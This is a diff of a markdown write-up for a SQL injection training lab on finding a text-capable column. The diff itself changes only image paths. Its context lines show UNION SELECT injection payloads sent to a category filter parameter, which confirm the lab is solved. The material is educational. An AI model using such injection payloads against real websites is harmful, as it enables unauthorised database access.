@@ -13,7 +13,7 @@
    ```
 3. Replace each NULL with the provided random string (e.g. `'xYi09M'`) one by one until no error occurs.
 
-![Lab 4 Solution Summary](../Image%20Asset/Lab-04-%20SQL%20injection%20UNION%20attack,%20finding%20a%20column%20containing%20text/Pasted%20image%2020260801023709.png)
+![Lab 4 Solution Summary](Pasted%20image%2020260801023709.png)
 
 ---
 
@@ -25,7 +25,7 @@ Inject string value in position 1:
 /filter?category=Corporate+gifts'+UNION+SELECT+'xYi09M',NULL,NULL--
 ```
 
-![Lab 4 Test Column 1](../Image%20Asset/Lab-04-%20SQL%20injection%20UNION%20attack,%20finding%20a%20column%20containing%20text/Pasted%20image%2020260801024117.png)
+![Lab 4 Test Column 1](Pasted%20image%2020260801024117.png)
 
 ### Step 2: Probe Column 2
 Inject string value in position 2:
@@ -33,7 +33,7 @@ Inject string value in position 2:
 /filter?category=Corporate+gifts'+UNION+SELECT+NULL,'xYi09M',NULL--
 ```
 
-![Lab 4 Test Column 2 Solved](../Image%20Asset/Lab-04-%20SQL%20injection%20UNION%20attack,%20finding%20a%20column%20containing%20text/Pasted%20image%2020260801024233.png)
+![Lab 4 Test Column 2 Solved](Pasted%20image%2020260801024233.png)
 
 > [!SUCCESS]
 > **Lab Solved**: Column 2 successfully rendered the random string `'xYi09M'`, confirming it supports String/Text data type!
